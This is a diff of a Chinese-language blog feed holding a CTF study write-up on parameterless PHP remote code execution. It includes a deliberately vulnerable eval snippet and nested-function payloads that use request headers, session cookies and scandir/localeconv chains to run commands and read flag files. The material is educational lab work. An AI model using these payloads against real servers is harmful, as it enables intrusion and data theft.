+<p>可以利用<code>getcwd()</code>获取当前目录</p>
+<p>故<code>scandir(grtcwd())</code>可以获取到当前目录下的文件名</p>
+<p><code>scandir(&#39;.&#39;)</code>也可以获取到当前目录下的文件名（flag.php就在当前目录）。由于是无参数RCE，不能传入参数<code>.</code>，那么如何获取<code>.</code>呢？有以下方法：</p>
+<ul>
+<li><p><code>chr(46)</code>：<code>chr(46)</code>就是<code>.</code>，那么如何获取46这个数字呢？</p>
+<ul>
+<li><p><code>chr(rand())</code>：<code>rand()</code>会随时生成一个大数，<code>chr()</code>函数会对参数进行256取余运算，因此<code>chr(rand())</code>有1&#x2F;256的概率是我们希望获取的字符。因此，可以抓包重放，平均256个包成功获取1次<code>chr(46)</code>。</p>
+</li>
+<li><p><code>chr(time())</code>：<code>time()</code>返回时间戳，一秒一变。因此使用<code>chr(time())</code>，每256秒可以获取到1次<code>chr(46)</code>。</p>
+</li>
+<li><p><code>chr(current(localtime(time())))</code>：<code>localtime(time())</code>返回一个数组，数组的0号元素表示当前时间的秒（范围是0-59），<code>current</code>是取数组的第一个元素（0号元素）。因此使<code>chr(current(localtime(time())))</code>，每60秒可以获取到1次<code>chr(46)</code>。</p>
+</li>
+</ul>
+</li>
+<li><p><code>current(localeconv())</code>：<code>localeconv()</code> 函数返回包含本地数字及货币信息格式的数组，其第一个元素就</p>
+<p>是<code>.</code>。因此<code>current(localeconv())</code>或者<code>pos(localeconv())</code>可以确定获取<code>.</code>，推荐使用该方法。</p>
+</li>
+<li><p><code>phpversion()</code>：利用php版本信息，比如：7.2.1，提取出大版本号（比如7或者5），在经过运算得到46，然后<code>chr(46)</code>得到<code>.</code>，命令为：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ceil</span>(<span class="title function_ invoke__">sinh</span>(<span class="title function_ invoke__">cosh</span>(<span class="title function_ invoke__">tan</span>(<span class="title function_ invoke__">floor</span>(<span class="title function_ invoke__">sqrt</span>(<span class="title function_ invoke__">floor</span>(<span class="title function_ invoke__">phpversion</span>())))))))) <span class="comment">#版本为5或者7都可以</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>crypt()</code>：该函数会随机生成一个hash值。命令为：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">hebrevc</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">time</span>()))))</span><br><span class="line"><span class="comment"># 大概率得到$ 小概率得到.</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h6 id="查看上级目录"><a href="#查看上级目录" class="headerlink" title="查看上级目录"></a>查看上级目录</h6><p><code>dirname()</code></p>
+<p>如果传入的值是绝对路径（不包含文件名），则返回的是上一层路径，传入的是文件名绝对路径则返回文件的当前路径。就如：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">getcwd</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">string</span>(<span class="number">13</span>) <span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line"></span><br><span class="line">?code=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>())));</span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">4</span>) &#123; [<span class="number">0</span>]=&gt; <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;.&quot;</span> [<span class="number">1</span>]=&gt; <span class="keyword">string</span>(<span class="number">2</span>) <span class="string">&quot;..&quot;</span> [<span class="number">2</span>]=&gt; <span class="keyword">string</span>(<span class="number">14</span>) <span class="string">&quot;flag_phpbyp4ss&quot;</span> [<span class="number">3</span>]=&gt; <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;html&quot;</span> &#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>chdir()</code></p>
+<p>改变当前工作目录，就如将当前目录切换为<code>/var/www</code></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>()))</span><br></pre></td></tr></table></figure>
+
+<p>就可以读取<code>flag_phpbyp4ss</code>文件</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost/?code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/11/18/5EUun8xS6sXQ3aA.png" alt="image.png"></p>
+<h5 id="从数组中取到目标文件（假设为flag-php）"><a href="#从数组中取到目标文件（假设为flag-php）" class="headerlink" title="从数组中取到目标文件（假设为flag.php）"></a>从数组中取到目标文件（假设为flag.php）</h5><h6 id="end-1"><a href="#end-1" class="headerlink" title="end()"></a><code>end()</code></h6><p>如果flag.php是返回数组的最后一个元素，直接用<code>end()</code>取出即可</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())))</span><br></pre></td></tr></table></figure>
+
+<h6 id="next-array-reverse"><a href="#next-array-reverse" class="headerlink" title="next(array_reverse())"></a><code>next(array_reverse())</code></h6><p>如果flag.php是返回数组的倒数第二个元素，可以通过<code>array_reverse()</code>函数，将数组逆转。这样flag.php就是输出数组的正数第二个元素，可以通过<code>next()</code>操作取到</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>()))))</span><br></pre></td></tr></table></figure>
+
+<h6 id="array-rand-array-flip"><a href="#array-rand-array-flip" class="headerlink" title="array_rand(array_flip())"></a><code>array_rand(array_flip())</code></h6><p><code>array_flip()</code>是将数组的键和值交换，<code>array_rand()</code>是随机取出数组的一个键。<code>array_rand(array_flip())</code>方法就是将数组中的flag.php由值改为键，再用随机的方式取出</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>()))))</span><br></pre></td></tr></table></figure>
+
+<p>这种方法的优势是目标字符串在数组的任意位置都可以，缺点是该方法不是100%成功的，需要重放。</p>
+<h5 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>())</span><br><span class="line"><span class="title function_ invoke__">show_source</span>()</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>()</span><br><span class="line"><span class="title function_ invoke__">readfile</span>()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>命令执行</category>
+      </categories>
+      <tags>
+        <tag>命令执行</tag>
+        <tag>RCE</tag>
       </tags>
   </entry>
   <entry>
@@ -1051,114 +1159,6 @@
 
 <p>上传一个txt文档，用burp抓包，在改文件内容和cmd的值就行了</p>
 <p><img src="https://s2.loli.net/2023/11/19/xVkav6YIHjKfgXN.png" alt="image-20231119172006358"></p>
-]]></content>
-      <categories>
-        <category>命令执行</category>
-      </categories>
-      <tags>
-        <tag>命令执行</tag>
-        <tag>RCE</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>无参数RCE学习记录</title>
-    <url>/2024/03/09/%E6%97%A0%E5%8F%82%E6%95%B0RCE/</url>
-    <content><![CDATA[<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="RCE前置知识"><a href="#RCE前置知识" class="headerlink" title="RCE前置知识"></a>RCE前置知识</h2><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>())</span><br><span class="line"><span class="title function_ invoke__">show_source</span>()</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>()</span><br><span class="line"><span class="title function_ invoke__">readfile</span>()</span><br></pre></td></tr></table></figure>
-
-<span id="more"></span>
-
-<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">get_defined_vars</span>()))) </span><br><span class="line">cat$&#123;IFS&#125;flag.php</span><br></pre></td></tr></table></figure>
-
-<h3 id="操作数组的方法"><a href="#操作数组的方法" class="headerlink" title="操作数组的方法"></a>操作数组的方法</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">current</span>()/<span class="title function_ invoke__">pos</span>() - 默认返回数组第一个元素</span><br><span class="line"><span class="title function_ invoke__">end</span>() – 将内部指针指向数组中的最后一个元素，并输出</span><br><span class="line"><span class="title function_ invoke__">next</span>() – 将内部指针指向数组中的下一个元素，并输出</span><br><span class="line"><span class="title function_ invoke__">prev</span>() – 将内部指针指向数组中的上一个元素，并输出</span><br><span class="line"><span class="title function_ invoke__">reset</span>() – 将内部指针指向数组中的第一个元素，并输出</span><br><span class="line"><span class="title function_ invoke__">each</span>() – 返回当前元素的键名和键值，并将内部指针向前移动，用于遍历</span><br></pre></td></tr></table></figure>
-
-<h2 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h2><p>无参rce，就是说在无法传入参数的情况下，仅仅依靠传入没有参数的函数套娃就可以达到命令执行的效果，这在ctf中也算是一个比较常见的考点，接下来就来详细总结总结它的利用姿势</p>
-<h3 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123; </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2023/11/18/xjsHJqSy7uOpTEt.png" alt="image.png"></p>
-<p>这段代码的核心就是只允许函数而不允许函数中的参数，就是说传进去的值是一个字符串接一个<code>()</code>，那么这个字符串就会被替换为空，如果替换后只剩下<code>;</code>，那么这段代码就会被<code>eval</code>执行。而且因为这个正则表达式是递归调用的，所以说像<code>a(b(c()));</code>第一次匹配后就还剩下<code>a(b());</code>，第二次匹配后就还剩<code>a();</code>，第三次匹配后就还剩<code>;</code>了，所以说这一串<code>a(b(c()));</code>就会被<code>eval</code>执行，但相反，像<code>a(b(&#39;111&#39;));</code>这种存在参数的就不行，因为无论正则匹配多少次它的参数总是存在的。</p>
-<h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h3><h4 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a><code>getallheaders()</code></h4><p>这个函数的作用是获取<code>http</code>所有的头部信息，也就是<code>headers</code>，然后我们可以用<code>var_dump</code>把它打印出来，但这个有个限制条件就是必须在<code>apache</code>的环境下可以使用，其它环境都是用不了的，我们到burp中去做演示,测试代码如下：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&#x27;please input code&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2023/11/18/y4DBgjpVTUtZNe1.png" alt="image.png"></p>
-<h5 id="end"><a href="#end" class="headerlink" title="end()"></a><code>end()</code></h5><p>可以看到，所有的头部信息都已经作为了一个<strong>数组</strong>打印了出来，在实际的运用中，我们肯定不需要这么多条，不然它到底执行哪一条呢？所以我们需要选择一条出来然后就执行它，这里就需要用到<code>php</code>中操纵数组的函数了，这里常见的是利用<code>end()</code>函数取出最后一位，这里的效果如下图所示，而且它只会以<strong>字符串</strong>的形式取出<strong>值</strong>而不会取出键，所以说键名随便取就行：</p>
-<p><img src="https://s2.loli.net/2023/11/18/s6E1xhMGV7BkvKL.png" alt="image.png"></p>
-<p>那我们把最前面的<code>var_dump</code>改成<code>eval</code>，不就可以执行<code>phpinfo</code>了吗，换言之，就可以实现任意php代码的代码执行了，那在没有过滤的情况下执行命令也就轻而易举了，具体效果如下图所示</p>
-<p><img src="https://s2.loli.net/2023/11/18/XSg3hl9KVCG4pYs.png" alt="image.png"></p>
-<p><img src="https://s2.loli.net/2023/11/18/vHJQlgMuDy7tYio.png" alt="image.png"></p>
-<h5 id="end-被ban"><a href="#end-被ban" class="headerlink" title="end()被ban"></a><code>end()</code>被ban</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">getallheaders</span>()))</span><br><span class="line"><span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">getallheaders</span>()))</span><br></pre></td></tr></table></figure>
-
-<p>将数组倒置取第一个元素相当于<code>end()</code></p>
-<p>小小举个例子：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#添加字段</span></span><br><span class="line">test:flag.php</span><br><span class="line"><span class="comment">#访问的url</span></span><br><span class="line">?code=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">getallheaders</span>())) <span class="comment">#显示传输的参数</span></span><br><span class="line">?code=<span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">getallheaders</span>())) <span class="comment">#执行系统命令</span></span><br><span class="line">?code=<span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">getallheaders</span>())) <span class="comment">#查看文件内容</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a><code>get_defined_vars()</code></h4><p>上面说到了，<code>getallheaders()</code>是有局限性的，因为如果中间件不是<code>apache</code>的话，它就用不了了，那我们就介绍一种更为普遍的方法<code>get_defined_vars()</code>，这种方法其实和上面那种方法原理是差不多的：</p>
-<p><img src="https://s2.loli.net/2023/11/18/klJAPxwsBIScoUa.png" alt="image.png"></p>
-<p>可以看到，它并不是获取的<code>headers</code>，而是获取的四个全局变量<code>$_GET $_POST $_FILES $_COOKIE</code>，而它的返回值是一个二维数组（返回由所有已定义变量所组成的数组），我们利用<code>GET</code>方式传入的参数在第一个数组中。这里我们就需要先将二维数组转换为一维数组，这里我们用到<code>current()</code>函数，这个函数的作用是返回数组中的当前单元，而它的默认是第一个单元，也就是我们GET方式传入的参数，我们可以看看实际效果：</p>
-<p><img src="https://s2.loli.net/2023/11/18/x9yrZGsMaQTlAoK.png" alt="image.png"></p>
-<p>这里可以看到成功输出了我们二维数组中的第一个数据，也就是将GET的数据全部输出了出来，相当于它就已经变成了一个一维数组了，那按照我们上面的方法，我们就可以利用<code>end()</code>函数以字符串的形式取出最后的值，然后直接<code>eval</code>执行就行了，这里和上面就是一样的了。</p>
-<p>我们还可以用以下方法得到全局变量的值：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">get_defined_vars</span>())) <span class="comment">#取get的最后一个参数</span></span><br><span class="line"><span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">get_defined_vars</span>())) <span class="comment">#取post的最后一个参数</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2023/11/18/QACtqE6daXo4kPY.png" alt="smIJOtgU6pKfZkQ"></p>
-<p>这里还有一个专门针对<code>$_FILES</code>下手的方法，可以参考这篇文章：<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></p>
-<h4 id="session-id"><a href="#session-id" class="headerlink" title="session_id()"></a><code>session_id()</code></h4><p>这种方法和前面的也差不太多，这种方法简单来说就是把恶意代码写到<code>COOKIE</code>的<code>PHPSESSID</code>中，然后利用<code>session_id()</code>这个函数去读取它，返回一个字符串，然后我们就可以用<code>eval</code>去直接执行了，这里有一点要注意的就是<code>session_id()</code>要开启<code>session</code>才能用，所以说要先<code>session_start()</code>，这里我们先试着把<code>PHPSESSID</code>的值取出来：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>()));</span><br><span class="line">Cookie: PHPSESSID=...</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2023/11/18/vorOeBqGSmPNRTL.png" alt="image.png"></p>
-<p>直接出来就是字符串，那就非常完美，我们就不用去做任何的转换了，但这里要注意的是，<code>PHPSESSIID</code>中只能有<code>A-Z a-z 0-9</code>，<code>-</code>，所以说我们要先将恶意代码16进制编码以后再插入进去，而在php中，将16进制转换为字符串的函数为<code>hex2bin</code></p>
-<p><img src="https://s2.loli.net/2023/11/18/JruDwYiC5V39HAf.png" alt="image.png"></p>
-<p><img src="https://s2.loli.net/2023/11/18/XbGupMPaiDNTne1.png" alt="image.png"></p>
-<p>那我们就可以开始构造了，首先把<code>PHPSESSID</code>的值替换成这个，然后在前面把<code>var_dump</code>换成<code>eval</code>就可以成功执行了，如图：</p>
-<p><img src="https://s2.loli.net/2023/11/18/h8DxXSvGaQzs2gj.png" alt="image.png"></p>
-<p>成功出现<code>phpinfo</code>，稳稳当当，这种方法我认为是最好的一种方法，很容易理解，只是记得要将恶意代码先16进制编码一下哦。</p>
-<h4 id="PHP函数绕过"><a href="#PHP函数绕过" class="headerlink" title="PHP函数绕过"></a>PHP函数绕过</h4><h5 id="获取文件名"><a href="#获取文件名" class="headerlink" title="获取文件名"></a>获取文件名</h5><h6 id="scandir"><a href="#scandir" class="headerlink" title="scandir()"></a><code>scandir()</code></h6><p>这个函数很好理解，就是列出选中目录中的文件和目录</p>
-<p>可以利用<code>getcwd()</code>获取当前目录</p>
-<p>故<code>scandir(grtcwd())</code>可以获取到当前目录下的文件名</p>
-<p><code>scandir(&#39;.&#39;)</code>也可以获取到当前目录下的文件名（flag.php就在当前目录）。由于是无参数RCE，不能传入参数<code>.</code>，那么如何获取<code>.</code>呢？有以下方法：</p>
-<ul>
-<li><p><code>chr(46)</code>：<code>chr(46)</code>就是<code>.</code>，那么如何获取46这个数字呢？</p>
-<ul>
-<li><p><code>chr(rand())</code>：<code>rand()</code>会随时生成一个大数，<code>chr()</code>函数会对参数进行256取余运算，因此<code>chr(rand())</code>有1&#x2F;256的概率是我们希望获取的字符。因此，可以抓包重放，平均256个包成功获取1次<code>chr(46)</code>。</p>
-</li>
-<li><p><code>chr(time())</code>：<code>time()</code>返回时间戳，一秒一变。因此使用<code>chr(time())</code>，每256秒可以获取到1次<code>chr(46)</code>。</p>
-</li>
-<li><p><code>chr(current(localtime(time())))</code>：<code>localtime(time())</code>返回一个数组，数组的0号元素表示当前时间的秒（范围是0-59），<code>current</code>是取数组的第一个元素（0号元素）。因此使<code>chr(current(localtime(time())))</code>，每60秒可以获取到1次<code>chr(46)</code>。</p>
-</li>
-</ul>
-</li>
-<li><p><code>current(localeconv())</code>：<code>localeconv()</code> 函数返回包含本地数字及货币信息格式的数组，其第一个元素就</p>
-<p>是<code>.</code>。因此<code>current(localeconv())</code>或者<code>pos(localeconv())</code>可以确定获取<code>.</code>，推荐使用该方法。</p>
-</li>
-<li><p><code>phpversion()</code>：利用php版本信息，比如：7.2.1，提取出大版本号（比如7或者5），在经过运算得到46，然后<code>chr(46)</code>得到<code>.</code>，命令为：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ceil</span>(<span class="title function_ invoke__">sinh</span>(<span class="title function_ invoke__">cosh</span>(<span class="title function_ invoke__">tan</span>(<span class="title function_ invoke__">floor</span>(<span class="title function_ invoke__">sqrt</span>(<span class="title function_ invoke__">floor</span>(<span class="title function_ invoke__">phpversion</span>())))))))) <span class="comment">#版本为5或者7都可以</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p><code>crypt()</code>：该函数会随机生成一个hash值。命令为：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">hebrevc</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">time</span>()))))</span><br><span class="line"><span class="comment"># 大概率得到$ 小概率得到.</span></span><br></pre></td></tr></table></figure></li>
-</ul>
-<h6 id="查看上级目录"><a href="#查看上级目录" class="headerlink" title="查看上级目录"></a>查看上级目录</h6><p><code>dirname()</code></p>
-<p>如果传入的值是绝对路径（不包含文件名），则返回的是上一层路径，传入的是文件名绝对路径则返回文件的当前路径。就如：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">getcwd</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">string</span>(<span class="number">13</span>) <span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line"></span><br><span class="line">?code=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>())));</span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">4</span>) &#123; [<span class="number">0</span>]=&gt; <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;.&quot;</span> [<span class="number">1</span>]=&gt; <span class="keyword">string</span>(<span class="number">2</span>) <span class="string">&quot;..&quot;</span> [<span class="number">2</span>]=&gt; <span class="keyword">string</span>(<span class="number">14</span>) <span class="string">&quot;flag_phpbyp4ss&quot;</span> [<span class="number">3</span>]=&gt; <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;html&quot;</span> &#125;</span><br></pre></td></tr></table></figure>
-
-<p><code>chdir()</code></p>
-<p>改变当前工作目录，就如将当前目录切换为<code>/var/www</code></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>()))</span><br></pre></td></tr></table></figure>
-
-<p>就可以读取<code>flag_phpbyp4ss</code>文件</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost/?code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2023/11/18/5EUun8xS6sXQ3aA.png" alt="image.png"></p>
-<h5 id="从数组中取到目标文件（假设为flag-php）"><a href="#从数组中取到目标文件（假设为flag-php）" class="headerlink" title="从数组中取到目标文件（假设为flag.php）"></a>从数组中取到目标文件（假设为flag.php）</h5><h6 id="end-1"><a href="#end-1" class="headerlink" title="end()"></a><code>end()</code></h6><p>如果flag.php是返回数组的最后一个元素，直接用<code>end()</code>取出即可</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())))</span><br></pre></td></tr></table></figure>
-
-<h6 id="next-array-reverse"><a href="#next-array-reverse" class="headerlink" title="next(array_reverse())"></a><code>next(array_reverse())</code></h6><p>如果flag.php是返回数组的倒数第二个元素，可以通过<code>array_reverse()</code>函数，将数组逆转。这样flag.php就是输出数组的正数第二个元素，可以通过<code>next()</code>操作取到</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>()))))</span><br></pre></td></tr></table></figure>
-
-<h6 id="array-rand-array-flip"><a href="#array-rand-array-flip" class="headerlink" title="array_rand(array_flip())"></a><code>array_rand(array_flip())</code></h6><p><code>array_flip()</code>是将数组的键和值交换，<code>array_rand()</code>是随机取出数组的一个键。<code>array_rand(array_flip())</code>方法就是将数组中的flag.php由值改为键，再用随机的方式取出</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>()))))</span><br></pre></td></tr></table></figure>
-
-<p>这种方法的优势是目标字符串在数组的任意位置都可以，缺点是该方法不是100%成功的，需要重放。</p>
-<h5 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>())</span><br><span class="line"><span class="title function_ invoke__">show_source</span>()</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>()</span><br><span class="line"><span class="title function_ invoke__">readfile</span>()</span><br></pre></td></tr></table></figure>
-
 ]]></content>
       <categories>
         <category>命令执行</category>
